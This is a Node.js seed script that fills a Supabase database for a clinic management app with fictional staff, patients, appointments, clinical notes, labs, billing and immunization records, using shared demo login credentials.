import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFileSync, existsSync } from "node:fs";
import { resolve } from "node:path";
import { createClient } from "@supabase/supabase-js";

function loadEnvFile() {
  const envPath = resolve(process.cwd(), ".env");
  if (!existsSync(envPath)) {
    return;
  }

  const raw = readFileSync(envPath, "utf8");
  for (const line of raw.split(/\r?\n/)) {
    if (!line || line.trim().startsWith("#")) {
      continue;
    }

    const separator = line.indexOf("=");
    if (separator === -1) {
      continue;
    }

    const key = line.slice(0, separator).trim();
    const value = line.slice(separator + 1).trim();
    if (key && !process.env[key]) {
      process.env[key] = value;
    }
  }
}

loadEnvFile();

const supabaseUrl = process.env.SUPABASE_URL;
const serviceKey = process.env.SUPABASE_SERVICE_KEY;

if (!supabaseUrl || !serviceKey) {
  console.error("SUPABASE_URL and SUPABASE_SERVICE_KEY must be configured in .env");
  process.exit(1);
}

const supabase = createClient(supabaseUrl, serviceKey, {
  auth: {
    autoRefreshToken: false,
    persistSession: false
  }
});

const clinic = {
  id: "clinic-northstar",
  name: "Northstar Family Health",
  address: "1250 Harbor View Drive, Seattle, WA 98101",
  phone: "555-010-9000"
};

const userSeeds = [
  {
    key: "admin",
    email: "admin@medflow.dev",
    password: "Medflow123!",
    fullName: "Morgan Lee",
    role: "admin"
  },
  {
    key: "doctor_1",
    email: "dr.singh@medflow.dev",
    password: "Medflow123!",
    fullName: "Dr. Arjun Singh",
    role: "doctor",
    specialty: "Family Medicine",
    licenseNumber: "FM-20918"
  },
  {
    key: "doctor_2",
    email: "dr.morales@medflow.dev",
    password: "Medflow123!",
    fullName: "Dr. Elena Morales",
    role: "doctor",
    specialty: "Internal Medicine",
    licenseNumber: "IM-44518"
  },
  {
    key: "staff",
    email: "staff@medflow.dev",
    password: "Medflow123!",
    fullName: "Priya Patel",
    role: "staff"
  },
  {
    key: "patient_1",
    email: "jordan.baker@medflow.dev",
    password: "Medflow123!",
    fullName: "Jordan Baker",
    role: "patient",
    patient: {
      id: "3d39d534-8158-47d4-9e1c-c481c77f3ba7",
      firstName: "Jordan",
      lastName: "Baker",
      dob: "1988-04-21",
      gender: "female",
      phone: "5550101122",
      insuranceId: "AET-4439201",
      guardianName: "Nina Baker",
      allergies: ["Penicillin"],
      medications: ["Metformin 500mg"],
      diagnoses: ["Type 2 diabetes"],
      pastMedicalHistory: "<p>History of gestational diabetes in 2018.</p><ul><li>Laparoscopic cholecystectomy in 2016</li><li>Long-term metformin use since 2023</li></ul>"
    }
  },
  {
    key: "patient_2",
    email: "marcus.nguyen@medflow.dev",
    password: "Medflow123!",
    fullName: "Marcus Nguyen",
    role: "patient",
    patient: {
      id: "1af85827-d1b2-4754-b739-01b499f14543",
      firstName: "Marcus",
      lastName: "Nguyen",
      dob: "1975-09-13",
      gender: "male",
      phone: "5550113355",
      insuranceId: "BCBS-9003312",
      guardianName: "",
      allergies: ["Latex"],
      medications: ["Lisinopril 10mg"],
      diagnoses: ["Hypertension"],
      pastMedicalHistory: "<p>Remote left ankle fracture repaired in 2008.</p><p>Chronic hypertension controlled with ACE inhibitor therapy.</p>"
    }
  },
  {
    key: "patient_3",
    email: "aisha.rahman@medflow.dev",
    password: "Medflow123!",
    fullName: "Aisha Rahman",
    role: "patient",
    patient: {
      id: "d27e0f8b-f2e4-49e4-ae13-0a5bf50cd5ee",
      firstName: "Aisha",
      lastName: "Rahman",
      dob: "1993-12-02",
      gender: "female",
      phone: "5550127841",
      insuranceId: "UHC-7812240",
      guardianName: "Samira Rahman",
      allergies: [],
      medications: ["Albuterol inhaler"],
      diagnoses: ["Mild persistent asthma"],
      pastMedicalHistory: "<p>Childhood asthma with intermittent exacerbations.</p><ul><li>No surgeries</li><li>Uses rescue inhaler during seasonal flares</li></ul>"
    }
  }
];

const providerSeeds = [
  {
    id: "5df92f58-7de2-4501-a4ae-71b8d64b1d06",
    userKey: "doctor_1",
    fullName: "Dr. Arjun Singh",
    specialty: "Family Medicine",
    licenseNumber: "FM-20918"
  },
  {
    id: "15caf2e0-1556-4f4d-bf78-a25dca855f16",
    userKey: "doctor_2",
    fullName: "Dr. Elena Morales",
    specialty: "Internal Medicine",
    licenseNumber: "IM-44518"
  }
];

const appointmentSeeds = [
  {
    id: "7f79b694-8188-4f2c-a39c-2efb672e9e3f",
    patientKey: "patient_1",
    providerId: "5df92f58-7de2-4501-a4ae-71b8d64b1d06",
    appointmentTime: "2026-03-15T15:00:00.000Z",
    durationMinutes: 30,
    status: "scheduled",
    reason: "Diabetes follow-up",
    notes: "Review A1C trend and medication adherence."
  },
  {
    id: "0a3d58dc-4460-46e4-bf08-31a8206dfa38",
    patientKey: "patient_2",
    providerId: "15caf2e0-1556-4f4d-bf78-a25dca855f16",
    appointmentTime: "2026-03-16T17:30:00.000Z",
    durationMinutes: 45,
    status: "scheduled",
    reason: "Annual physical",
    notes: "Patient requested fasting lab panel."
  },
  {
    id: "e02e5c98-f5ee-4189-afb9-c1ce8264f507",
    patientKey: "patient_3",
    providerId: "15caf2e0-1556-4f4d-bf78-a25dca855f16",
    appointmentTime: "2026-03-17T11:00:00.000Z",
    durationMinutes: 20,
    status: "completed",
    reason: "Asthma medication review",
    notes: "Symptoms controlled; continue rescue inhaler."
  }
];

const prescriptionSeeds = [
  {
    id: "d64fe24b-7e3d-4fc7-90ed-2cae294b190b",
    patientKey: "patient_1",
    providerId: "5df92f58-7de2-4501-a4ae-71b8d64b1d06",
    drugName: "Metformin",
    dosage: "500mg",
    frequency: "Twice daily",
    duration: "90 days",
    issuedAt: "2026-03-11T11:00:00.000Z"
  },
  {
    id: "b52b7e6f-50f2-4ae1-9e58-65ece7a7bf88",
    patientKey: "patient_3",
    providerId: "15caf2e0-1556-4f4d-bf78-a25dca855f16",
    drugName: "Albuterol",
    dosage: "90 mcg",
    frequency: "Every 4-6 hours as needed",
    duration: "30 days",
    issuedAt: "2026-03-12T09:45:00.000Z"
  }
];

const labSeeds = [
  {
    id: "23c96840-58b9-4a23-b1c9-1ae2f06e4274",
    patientKey: "patient_1",
    testName: "Hemoglobin A1C",
    result: "7.1%",
    flag: "abnormal",
    collectedAt: "2026-03-08T10:00:00.000Z"
  },
  {
    id: "2711472b-bd90-477c-89b1-5e47b7fb0fa6",
    patientKey: "patient_2",
    testName: "Lipid Panel",
    result: "LDL 96 mg/dL",
    flag: "normal",
    collectedAt: "2026-03-07T09:30:00.000Z"
  },
  {
    id: "97d9dce8-fd80-42aa-9c79-fb1cb16e5212",
    patientKey: "patient_3",
    testName: "Peak Flow",
    result: "420 L/min",
    flag: "normal",
    collectedAt: "2026-03-06T08:15:00.000Z"
  }
];

const medicalRecordSeeds = [
  {
    id: "93ce23cf-87fc-48a4-b80c-d1f8f000db01",
    patientKey: "patient_1",
    visitId: appointmentSeeds[0].id,
    recordType: "soap_note",
    data: {
      subjective: "Patient reports improved diet adherence.",
      objective: "A1C trending down.",
      assessment: "Type 2 diabetes, improving control.",
      plan: "Continue metformin, repeat A1C in 3 months."
    }
  },
  {
    id: "2fa77f48-df8d-4fd2-a2fd-7344f0aa7d0d",
    patientKey: "patient_3",
    visitId: appointmentSeeds[2].id,
    recordType: "follow_up_note",
    data: {
      summary: "Asthma stable with rescue inhaler.",
      plan: "Continue current regimen and monitor seasonal triggers."
    }
  }
];

const auditLogSeeds = [
  {
    id: "f7a90024-e793-4eaf-b975-61f826a9bd39",
    userKey: "admin",
    action: "Seeded clinic users and baseline records",
    timestamp: "2026-03-10T08:40:00.000Z"
  },
  {
    id: "4df70f56-b7c0-4da9-8c25-3dde7c4a6eda",
    userKey: "doctor_1",
    action: "Issued prescription for Jordan Baker",
    timestamp: "2026-03-11T11:00:00.000Z"
  }
];
const generatedPatientCount = 72;
const firstNames = ["Aarav", "Anaya", "Riya", "Kabir", "Mira", "Ishaan", "Leena", "Noah", "Diya", "Rehan", "Sana", "Kiran"];
const lastNames = ["Sharma", "Patel", "Reddy", "Thomas", "Brooks", "Das", "Carter", "Fernandez", "Khan", "Mehta", "Roy", "Miller"];
const allergiesPool = ["Peanuts", "Shellfish", "Penicillin", "Dust", "Latex", "Pollen", "None"];
const diagnosesPool = ["Hypertension", "Type 2 diabetes", "Migraine", "Hypothyroidism", "Asthma", "Arthritis"];
const medicationPool = ["Metformin 500mg", "Lisinopril 10mg", "Levothyroxine 75mcg", "Vitamin D3", "Atorvastatin 20mg", "Albuterol inhaler"];
const historyTemplates = [
  "<p>Open reduction and internal fixation after wrist fracture in 2019.</p><p>Completed six months of physiotherapy and now has full range of motion.</p>",
  "<p>Appendectomy performed in 2014 without complications.</p><ul><li>Seasonal allergic rhinitis</li><li>Uses cetirizine during spring months</li></ul>",
  "<p>Long-term hypertension monitored since 2020.</p><p>Home blood pressure log reviewed quarterly.</p>",
  "<p>History of asthma since childhood.</p><ul><li>No prior ICU admissions</li><li>Uses rescue inhaler during viral illnesses</li></ul>",
  "<p>Remote meniscus repair in 2017.</p><p>Intermittent knee pain with prolonged standing.</p>",
  "<p>Gestational diabetes in prior pregnancy.</p><p>Ongoing annual metabolic screening recommended.</p>"
];

function seededUuid(prefix, index) {
  return `${prefix}-0000-4000-8000-${String(index + 1).padStart(12, "0")}`;
}

function seededDate(index) {
  const year = 1958 + (index % 55);
  const month = String((index % 12) + 1).padStart(2, "0");
  const day = String((index % 27) + 1).padStart(2, "0");
  return `${year}-${month}-${day}`;
}

function seededTimestamp(index, monthOffset = 0) {
  const day = String((index % 27) + 1).padStart(2, "0");
  const hour = String(8 + (index % 9)).padStart(2, "0");
  return `2026-${String(1 + monthOffset).padStart(2, "0")}-${day}T${hour}:00:00.000Z`;
}

const generatedPatients = Array.from({ length: generatedPatientCount }, (_, index) => {
  const firstName = firstNames[index % firstNames.length];
  const lastName = `${lastNames[index % lastNames.length]} ${String.fromCharCode(65 + (index % 4))}`;
  const gender = index % 3 === 0 ? "female" : index % 3 === 1 ? "male" : "other";
  const allergy = allergiesPool[index % allergiesPool.length];
  const diagnosis = diagnosesPool[index % diagnosesPool.length];
  const medication = medicationPool[index % medicationPool.length];
  const isMinor = index % 9 === 0;

  return {
    key: `generated_patient_${index + 1}`,
    id: seededUuid("00000010", index),
    firstName,
    lastName,
    dob: seededDate(index),
    gender,
    guardianName: isMinor ? `${lastNames[(index + 3) % lastNames.length]} Guardian` : "",
    phone: `55502${String(index + 1).padStart(5, "0")}`,
    email: `${firstName.toLowerCase()}.${lastName.toLowerCase().replace(/\s+/g, "-")}@seed.medflow.dev`,
    insuranceId: `NFH-${String(index + 1000).padStart(6, "0")}`,
    allergies: allergy === "None" ? [] : [allergy],
    medications: [medication],
    diagnoses: [diagnosis],
    pastMedicalHistory: historyTemplates[index % historyTemplates.length]
  };
});

const generatedAppointments = generatedPatients.slice(0, 48).map((patient, index) => ({
  id: seededUuid("00000020", index),
  patientKey: patient.key,
  providerId: providerSeeds[index % providerSeeds.length].id,
  appointmentTime: seededTimestamp(index, 2),
  durationMinutes: index % 4 === 0 ? 45 : 30,
  status: index % 5 === 0 ? "completed" : "scheduled",
  reason: index % 2 === 0 ? "Chronic care review" : "Preventive follow-up",
  notes: `Generated schedule slot for ${patient.firstName} ${patient.lastName}.`
}));

const generatedPrescriptions = generatedPatients.filter((_, index) => index % 3 === 0).map((patient, index) => ({
  id: seededUuid("00000030", index),
  patientKey: patient.key,
  providerId: providerSeeds[index % providerSeeds.length].id,
  drugName: medicationPool[index % medicationPool.length].split(" ")[0],
  dosage: index % 2 === 0 ? "10mg" : "500mg",
  frequency: index % 2 === 0 ? "Once daily" : "Twice daily",
  duration: index % 4 === 0 ? "90 days" : "30 days",
  issuedAt: seededTimestamp(index, 1)
}));

const generatedLabs = generatedPatients.filter((_, index) => index % 2 === 0).map((patient, index) => ({
  id: seededUuid("00000040", index),
  patientKey: patient.key,
  testName: index % 3 === 0 ? "Complete Blood Count" : index % 3 === 1 ? "Lipid Panel" : "Hemoglobin A1C",
  result: index % 3 === 0 ? "Within normal range" : index % 3 === 1 ? "LDL 118 mg/dL" : "6.9%",
  flag: index % 4 === 0 ? "abnormal" : "normal",
  collectedAt: seededTimestamp(index, 0)
}));

const generatedMedicalRecords = generatedPatients.slice(0, 18).map((patient, index) => ({
  id: seededUuid("00000050", index),
  patientKey: patient.key,
  visitId: generatedAppointments[index]?.id ?? null,
  recordType: "history_update",
  data: {
    summary: patient.pastMedicalHistory,
    updatedBy: providerSeeds[index % providerSeeds.length].fullName
  }
}));

const encounterSeeds = [
  {
    id: "f2458ab2-8530-49d9-8db9-46e2f034fd3b",
    patientKey: "patient_1",
    providerId: "5df92f58-7de2-4501-a4ae-71b8d64b1d06",
    appointmentId: appointmentSeeds[0].id,
    visitReason: "Diabetes follow-up and medication review",
    status: "completed",
    createdAt: "2026-03-15T15:20:00.000Z"
  },
  {
    id: "f1dc1780-cda4-4ea8-8f9b-b193935f24f0",
    patientKey: "patient_2",
    providerId: "15caf2e0-1556-4f4d-bf78-a25dca855f16",
    appointmentId: appointmentSeeds[1].id,
    visitReason: "Annual preventive exam",
    status: "in_progress",
    createdAt: "2026-03-16T17:45:00.000Z"
  },
  {
    id: "d53f0d6e-8ab7-4620-b1e8-99812b739f2d",
    patientKey: "patient_3",
    providerId: "15caf2e0-1556-4f4d-bf78-a25dca855f16",
    appointmentId: appointmentSeeds[2].id,
    visitReason: "Asthma symptom control check",
    status: "completed",
    createdAt: "2026-03-17T11:15:00.000Z"
  }
];

const generatedEncounters = generatedAppointments.slice(0, 24).map((appointment, index) => {
  const computedStatus = appointment.status === "completed"
    ? "completed"
    : index % 2 === 0
      ? "in_progress"
      : "draft";

  return {
    id: seededUuid("00000060", index),
    patientKey: appointment.patientKey,
    providerId: appointment.providerId,
    appointmentId: appointment.id,
    visitReason: appointment.reason,
    status: computedStatus,
    createdAt: seededTimestamp(index, 2)
  };
});

async function assertSchemaExists() {
  const { error } = await supabase.from("clinics").select("id").limit(1);
  if (!error) {
    return;
  }

  if (String(error.message || "").includes("Could not find the table") || error.code === "PGRST205") {
    throw new Error("Supabase schema is not initialized. Run the SQL files in supabase/migrations in order in the Supabase SQL editor first.");
  }

  throw error;
}

async function assertMustHaveSchemaExists() {
  const { error } = await supabase.from("encounters").select("id").limit(1);
  if (!error) {
    return;
  }

  if (String(error.message || "").includes("Could not find the table") || error.code === "PGRST205") {
    throw new Error("Must-have schema is not initialized. Run supabase/migrations/0003_must_have_features.sql in the Supabase SQL editor first.");
  }

  throw error;
}

async function listAllAuthUsers() {
  const users = [];
  let page = 1;

  while (true) {
    const { data, error } = await supabase.auth.admin.listUsers({ page, perPage: 200 });
    if (error) {
      throw error;
    }

    users.push(...data.users);
    if (data.users.length < 200) {
      break;
    }

    page += 1;
  }

  return users;
}

async function ensureAuthUser(seed, existingUserMap) {
  const existing = existingUserMap.get(seed.email.toLowerCase());

  if (existing) {
    const { data, error } = await supabase.auth.admin.updateUserById(existing.id, {
      email: seed.email,
      password: seed.password,
      email_confirm: true,
      user_metadata: {
        full_name: seed.fullName
      },
      app_metadata: {
        role: seed.role,
        clinic_id: clinic.id
      }
    });

    if (error) {
      throw error;
    }

    return data.user;
  }

  const { data, error } = await supabase.auth.admin.createUser({
    email: seed.email,
    password: seed.password,
    email_confirm: true,
    user_metadata: {
      full_name: seed.fullName
    },
    app_metadata: {
      role: seed.role,
      clinic_id: clinic.id
    }
  });

  if (error || !data.user) {
    throw error ?? new Error(`Unable to create auth user for ${seed.email}`);
  }

  return data.user;
}

async function main() {
  await assertSchemaExists();
  await assertMustHaveSchemaExists();

  const authUsers = await listAllAuthUsers();
  const existingUserMap = new Map(authUsers.map((user) => [String(user.email || "").toLowerCase(), user]));
  const authByKey = new Map();

  for (const seed of userSeeds) {
    const authUser = await ensureAuthUser(seed, existingUserMap);
    authByKey.set(seed.key, authUser);
  }

  const { error: clinicError } = await supabase.from("clinics").upsert({
    id: clinic.id,
    name: clinic.name,
    address: clinic.address,
    phone: clinic.phone
  }, { onConflict: "id" });
  if (clinicError) {
    throw clinicError;
  }

  const publicUsers = userSeeds.map((seed) => {
    const authUser = authByKey.get(seed.key);
    return {
      id: authUser.id,
      email: seed.email,
      full_name: seed.fullName,
      role: seed.role,
      clinic_id: clinic.id
    };
  });

  const { error: publicUsersError } = await supabase.from("users").upsert(publicUsers, { onConflict: "id" });
  if (publicUsersError) {
    throw publicUsersError;
  }

  const providerRows = providerSeeds.map((seed) => ({
    id: seed.id,
    user_id: authByKey.get(seed.userKey).id,
    clinic_id: clinic.id,
    full_name: seed.fullName,
    specialty: seed.specialty,
    license_number: seed.licenseNumber
  }));

  const { error: providersError } = await supabase.from("providers").upsert(providerRows, { onConflict: "id" });
  if (providersError) {
    throw providersError;
  }

  const authPatientRows = userSeeds
    .filter((seed) => seed.patient)
    .map((seed) => ({
      id: seed.patient.id,
      auth_user_id: authByKey.get(seed.key).id,
      clinic_id: clinic.id,
      first_name: seed.patient.firstName,
      last_name: seed.patient.lastName,
      dob: seed.patient.dob,
      gender: seed.patient.gender,
      guardian_name: seed.patient.guardianName,
      phone: seed.patient.phone,
      email: seed.email,
      insurance_id: seed.patient.insuranceId,
      allergies: seed.patient.allergies,
      medications: seed.patient.medications,
      diagnoses: seed.patient.diagnoses,
      past_medical_history: seed.patient.pastMedicalHistory
    }));

  const generatedPatientRows = generatedPatients.map((patient) => ({
    id: patient.id,
    auth_user_id: null,
    clinic_id: clinic.id,
    first_name: patient.firstName,
    last_name: patient.lastName,
    dob: patient.dob,
    gender: patient.gender,
    guardian_name: patient.guardianName,
    phone: patient.phone,
    email: patient.email,
    insurance_id: patient.insuranceId,
    allergies: patient.allergies,
    medications: patient.medications,
    diagnoses: patient.diagnoses,
    past_medical_history: patient.pastMedicalHistory
  }));

  const patientRows = [...authPatientRows, ...generatedPatientRows];

  const { error: patientsError } = await supabase.from("patients").upsert(patientRows, { onConflict: "id" });
  if (patientsError) {
    throw patientsError;
  }

  const patientIdsByKey = new Map([
    ...userSeeds.filter((seed) => seed.patient).map((seed) => [seed.key, seed.patient.id]),
    ...generatedPatients.map((patient) => [patient.key, patient.id])
  ]);

  for (const seed of userSeeds) {
    const authUser = authByKey.get(seed.key);
    const provider = providerSeeds.find((item) => item.userKey === seed.key);
    const patientId = patientIdsByKey.get(seed.key) ?? null;

    const { error } = await supabase.auth.admin.updateUserById(authUser.id, {
      app_metadata: {
        role: seed.role,
        clinic_id: clinic.id,
        provider_id: provider?.id ?? null,
        patient_id: patientId
      },
      user_metadata: {
        full_name: seed.fullName
      }
    });

    if (error) {
      throw error;
    }
  }

  const appointmentRows = [...appointmentSeeds, ...generatedAppointments].map((seed) => ({
    id: seed.id,
    patient_id: patientIdsByKey.get(seed.patientKey),
    provider_id: seed.providerId,
    clinic_id: clinic.id,
    appointment_time: seed.appointmentTime,
    duration_minutes: seed.durationMinutes,
    status: seed.status,
    reason: seed.reason,
    notes: seed.notes
  }));

  const { error: appointmentsError } = await supabase.from("appointments").upsert(appointmentRows, { onConflict: "id" });
  if (appointmentsError) {
    throw appointmentsError;
  }

  const allEncounterSeeds = [...encounterSeeds, ...generatedEncounters];
  const patientSnapshotByKey = new Map([
    ...userSeeds
      .filter((seed) => seed.patient)
      .map((seed) => [seed.key, seed.patient]),
    ...generatedPatients.map((patient) => [patient.key, patient])
  ]);

  const encounterRows = allEncounterSeeds.map((seed) => ({
    id: seed.id,
    patient_id: patientIdsByKey.get(seed.patientKey),
    provider_id: seed.providerId,
    clinic_id: clinic.id,
    appointment_id: seed.appointmentId ?? null,
    visit_reason: seed.visitReason,
    status: seed.status,
    created_at: seed.createdAt
  }));

  const { error: encountersError } = await supabase.from("encounters").upsert(encounterRows, { onConflict: "id" });
  if (encountersError) {
    throw encountersError;
  }

  const clinicalNoteRows = allEncounterSeeds.map((seed, index) => {
    const patient = patientSnapshotByKey.get(seed.patientKey);
    const fullName = patient ? `${patient.firstName} ${patient.lastName}` : "Patient";
    return {
      id: seededUuid("00000061", index),
      encounter_id: seed.id,
      subjective: `${fullName} reports stable symptoms with no acute concerns today.`,
      objective: "Vitals reviewed. Physical exam findings are documented as stable for current condition.",
      assessment: patient?.diagnoses?.[0] ?? "General follow-up encounter.",
      plan: "Continue current care plan, reinforce adherence, and return for routine follow-up.",
      updated_at: seededTimestamp(index, 3)
    };
  });

  const { error: clinicalNotesError } = await supabase.from("clinical_notes").upsert(clinicalNoteRows, { onConflict: "encounter_id" });
  if (clinicalNotesError) {
    throw clinicalNotesError;
  }

  const diagnosisRows = [];
  let diagnosisIndex = 0;
  for (const [index, seed] of allEncounterSeeds.entries()) {
    const patient = patientSnapshotByKey.get(seed.patientKey);
    diagnosisRows.push({
      id: seededUuid("00000062", diagnosisIndex++),
      encounter_id: seed.id,
      icd10_code: `Z09.${String((index % 9) + 1)}`,
      diagnosis_name: patient?.diagnoses?.[0] ?? "Routine follow-up",
      notes: "Primary diagnosis captured for encounter coding."
    });

    if (index % 4 === 0) {
      diagnosisRows.push({
        id: seededUuid("00000062", diagnosisIndex++),
        encounter_id: seed.id,
        icd10_code: `R53.${String((index % 5) + 1)}`,
        diagnosis_name: "Fatigue, unspecified",
        notes: "Additional symptom code documented for clinical context."
      });
    }
  }

  const { error: diagnosesError } = await supabase.from("diagnoses").upsert(diagnosisRows, { onConflict: "id" });
  if (diagnosesError) {
    throw diagnosesError;
  }

  const procedureRows = [];
  let procedureIndex = 0;
  for (const [index, seed] of allEncounterSeeds.entries()) {
    procedureRows.push({
      id: seededUuid("00000063", procedureIndex++),
      encounter_id: seed.id,
      cpt_code: index % 2 === 0 ? "99213" : "99214",
      procedure_name: index % 2 === 0 ? "Established patient office visit, low complexity" : "Established patient office visit, moderate complexity",
      notes: "Visit-level E/M coding captured from encounter documentation."
    });

    if (index % 3 === 0) {
      procedureRows.push({
        id: seededUuid("00000063", procedureIndex++),
        encounter_id: seed.id,
        cpt_code: "36415",
        procedure_name: "Collection of venous blood by venipuncture",
        notes: "Associated lab draw documented during visit."
      });
    }
  }

  const { error: proceduresError } = await supabase.from("procedures").upsert(procedureRows, { onConflict: "id" });
  if (proceduresError) {
    throw proceduresError;
  }

  const labOrderRows = allEncounterSeeds.slice(0, 16).map((seed, index) => ({
    id: seededUuid("00000064", index),
    patient_id: patientIdsByKey.get(seed.patientKey),
    provider_id: seed.providerId,
    clinic_id: clinic.id,
    encounter_id: seed.id,
    test_name: index % 3 === 0 ? "Comprehensive Metabolic Panel" : index % 3 === 1 ? "Lipid Panel" : "Hemoglobin A1C",
    lab_name: "Northstar Reference Lab",
    status: index % 5 === 0 ? "reviewed" : index % 2 === 0 ? "reported" : "ordered",
    ordered_at: seededTimestamp(index, 3)
  }));

  const { error: labOrdersError } = await supabase.from("lab_orders").upsert(labOrderRows, { onConflict: "id" });
  if (labOrdersError) {
    throw labOrdersError;
  }

  const labReportRows = labOrderRows
    .filter((order) => order.status === "reported" || order.status === "reviewed")
    .map((order, index) => ({
      id: seededUuid("00000065", index),
      lab_order_id: order.id,
      report_number: `RPT-2026-${String(index + 1).padStart(5, "0")}`,
      report_date: seededTimestamp(index, 3),
      result_summary: `Results finalized for ${order.test_name}.`,
      abnormal_flag: index % 4 === 0,
      file_url: `lab-reports/${order.id}.pdf`
    }));

  const { error: labReportsError } = await supabase.from("lab_reports").upsert(labReportRows, { onConflict: "id" });
  if (labReportsError) {
    throw labReportsError;
  }

  const labRows = [...labSeeds, ...generatedLabs].map((seed, index) => ({
    id: seed.id,
    patient_id: patientIdsByKey.get(seed.patientKey),
    clinic_id: clinic.id,
    test_name: seed.testName,
    result: seed.result,
    flag: seed.flag,
    collected_at: seed.collectedAt,
    report_id: labReportRows[index] ? labReportRows[index].id : null,
    test_component: seed.testName,
    value: seed.result,
    reference_range: index % 3 === 0 ? "Normal reference range varies by age and sex" : "",
    unit: seed.result.includes("%") ? "%" : seed.result.includes("mg/dL") ? "mg/dL" : ""
  }));

  const prescriptionRows = [...prescriptionSeeds, ...generatedPrescriptions].map((seed) => ({
    id: seed.id,
    patient_id: patientIdsByKey.get(seed.patientKey),
    provider_id: seed.providerId,
    clinic_id: clinic.id,
    drug_name: seed.drugName,
    dosage: seed.dosage,
    frequency: seed.frequency,
    duration: seed.duration,
    issued_at: seed.issuedAt
  }));

  const { error: prescriptionsError } = await supabase.from("prescriptions").upsert(prescriptionRows, { onConflict: "id" });
  if (prescriptionsError) {
    throw prescriptionsError;
  }

  const { error: labsError } = await supabase.from("lab_results").upsert(labRows, { onConflict: "id" });
  if (labsError) {
    throw labsError;
  }

  const completedEncounterRows = encounterRows.filter((row) => row.status === "completed").slice(0, 12);
  const billingClaimRows = completedEncounterRows.map((row, index) => {
    const claimStatus = index % 4 === 0 ? "paid" : index % 4 === 1 ? "partially_paid" : index % 4 === 2 ? "submitted" : "draft";
    return {
      id: seededUuid("00000066", index),
      patient_id: row.patient_id,
      encounter_id: row.id,
      provider_id: row.provider_id,
      clinic_id: clinic.id,
      claim_number: `CLM-2026-${String(index + 1).padStart(6, "0")}`,
      status: claimStatus,
      total_amount: index % 2 === 0 ? 210.0 : 325.0,
      submitted_at: claimStatus === "draft" ? null : seededTimestamp(index, 3)
    };
  });

  const { error: billingClaimsError } = await supabase.from("billing_claims").upsert(billingClaimRows, { onConflict: "id" });
  if (billingClaimsError) {
    throw billingClaimsError;
  }

  const billingItemRows = billingClaimRows.flatMap((claim, index) => {
    const baseAmount = index % 2 === 0 ? 140.0 : 215.0;
    const rows = [
      {
        id: seededUuid("00000067", index * 2),
        claim_id: claim.id,
        cpt_code: "99213",
        description: "Established patient office/outpatient visit",
        amount: baseAmount
      },
      {
        id: seededUuid("00000067", index * 2 + 1),
        claim_id: claim.id,
        cpt_code: "36415",
        description: "Collection of venous blood by venipuncture",
        amount: claim.total_amount - baseAmount
      }
    ];
    return rows;
  });

  const { error: billingItemsError } = await supabase.from("billing_items").upsert(billingItemRows, { onConflict: "id" });
  if (billingItemsError) {
    throw billingItemsError;
  }

  const paymentRows = billingClaimRows
    .filter((claim) => claim.status === "paid" || claim.status === "partially_paid")
    .map((claim, index) => ({
      id: seededUuid("00000068", index),
      claim_id: claim.id,
      payment_method: index % 2 === 0 ? "insurance" : "card",
      amount: claim.status === "paid" ? claim.total_amount : Number((claim.total_amount * 0.6).toFixed(2)),
      payment_date: seededTimestamp(index, 4)
    }));

  const { error: paymentsError } = await supabase.from("payments").upsert(paymentRows, { onConflict: "id" });
  if (paymentsError) {
    throw paymentsError;
  }

  const immunizationPatientKeys = [...new Set([...allEncounterSeeds.map((seed) => seed.patientKey), ...generatedPatients.slice(0, 18).map((patient) => patient.key)])];
  const immunizationRows = immunizationPatientKeys.map((patientKey, index) => ({
    id: seededUuid("00000069", index),
    patient_id: patientIdsByKey.get(patientKey),
    clinic_id: clinic.id,
    vaccine_name: index % 3 === 0 ? "Influenza (Inactivated)" : index % 3 === 1 ? "Tdap" : "COVID-19 mRNA Booster",
    dose_number: index % 2 === 0 ? 1 : 2,
    date_administered: `2025-${String((index % 12) + 1).padStart(2, "0")}-${String((index % 27) + 1).padStart(2, "0")}`,
    provider_id: providerSeeds[index % providerSeeds.length].id,
    lot_number: `LOT-${String(10000 + index).padStart(5, "0")}`,
    notes: "Seeded immunization record for timeline and due-date workflows.",
    next_due_date: index % 2 === 0 ? `2026-${String((index % 12) + 1).padStart(2, "0")}-${String((index % 27) + 1).padStart(2, "0")}` : null
  }));

  const { error: immunizationsError } = await supabase.from("immunizations").upsert(immunizationRows, { onConflict: "id" });
  if (immunizationsError) {
    throw immunizationsError;
  }

  const medicalRecordRows = [...medicalRecordSeeds, ...generatedMedicalRecords].map((seed) => ({
    id: seed.id,
    patient_id: patientIdsByKey.get(seed.patientKey),
    visit_id: seed.visitId,
    clinic_id: clinic.id,
    record_type: seed.recordType,
    data: seed.data
  }));

  const { error: recordsError } = await supabase.from("medical_records").upsert(medicalRecordRows, { onConflict: "id" });
  if (recordsError) {
    throw recordsError;
  }

  const auditRows = auditLogSeeds.map((seed, index) => ({
    id: seed.id,
    user_id: authByKey.get(seed.userKey).id,
    action: seed.action,
    timestamp: seed.timestamp,
    clinic_id: clinic.id,
    entity_type: "seed",
    entity_id: seededUuid("0000006a", index),
    changes: { source: "seed-script", action: seed.action },
    created_at: seed.timestamp
  }));

  const { error: auditError } = await supabase.from("audit_logs").upsert(auditRows, { onConflict: "id" });
  if (auditError) {
    throw auditError;
  }

  console.log("Seed completed successfully.\n");
  console.log(`Clinic: ${clinic.name} (${clinic.id})`);
  console.log("Users:");
  for (const seed of userSeeds) {
    console.log(`- ${seed.role.padEnd(7)} ${seed.email} / ${seed.password}`);
  }
  console.log("\nCreated or updated:");
  console.log(`- ${publicUsers.length} auth + public users`);
  console.log(`- ${providerRows.length} providers`);
  console.log(`- ${patientRows.length} patients`);
  console.log(`- ${appointmentRows.length} appointments`);
  console.log(`- ${encounterRows.length} encounters`);
  console.log(`- ${clinicalNoteRows.length} clinical notes`);
  console.log(`- ${diagnosisRows.length} diagnoses`);
  console.log(`- ${procedureRows.length} procedures`);
  console.log(`- ${prescriptionRows.length} prescriptions`);
  console.log(`- ${labOrderRows.length} lab orders`);
  console.log(`- ${labReportRows.length} lab reports`);
  console.log(`- ${labRows.length} lab results`);
  console.log(`- ${billingClaimRows.length} billing claims`);
  console.log(`- ${billingItemRows.length} billing items`);
  console.log(`- ${paymentRows.length} payments`);
  console.log(`- ${immunizationRows.length} immunizations`);
  console.log(`- ${medicalRecordRows.length} medical records`);
  console.log(`- ${auditRows.length} audit logs`);
}

main().catch((error) => {
  console.error("Seed failed.");
  console.error(error instanceof Error ? error.message : error);
  process.exit(1);
});




